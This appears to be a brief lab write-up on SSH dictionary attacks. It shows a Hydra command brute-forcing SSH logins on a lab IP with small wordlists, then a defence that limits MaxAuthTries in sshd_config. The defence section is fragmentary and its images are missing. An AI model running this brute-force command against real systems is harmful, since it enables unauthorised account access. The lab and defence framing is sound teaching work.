# 

The attack technique, also called a dictionary attack or brute force, is the mose basic attack and the most critical attack if successful.

Many attackers tries to Dictional Attack

Whether it's personal curiosity or financial reasons.

In particular, there are some kids who systematically try to automate attacks all over the world.

Even if the password is annoying, you should never use an easy password and ot should not be exposed.

ex) 1234, 1212, 0000

# ssh dictional attack

> Although it is a little far from the actual environment, the dictional file was arbitrarily reduced for the speed of the test.

# id passwd

> id: dodo
> passwd: dodo

``` bash
cat id.txt | nl | grep dodo
```
> 44 dodo

``` bash
cat passwd.txt | nl | grep dodo
```
> 44 dodo

# Attack Enviroment

``` bash
hydra -t 12 -L id.txt -P passwd.txt  10.10.1.8 ssh -V  
```

# defend

``` bash
sudo vim /etc/ssh/sshd_config
```

> Max Authnumber  && \
sudo service ssh status
![ssh_MAxAuthTries]()

![ssh_MAxAuthTries]()


``` bash
sudo service ssh reload && \
sudo service ssh status
```

# Result

![ssh_defened]
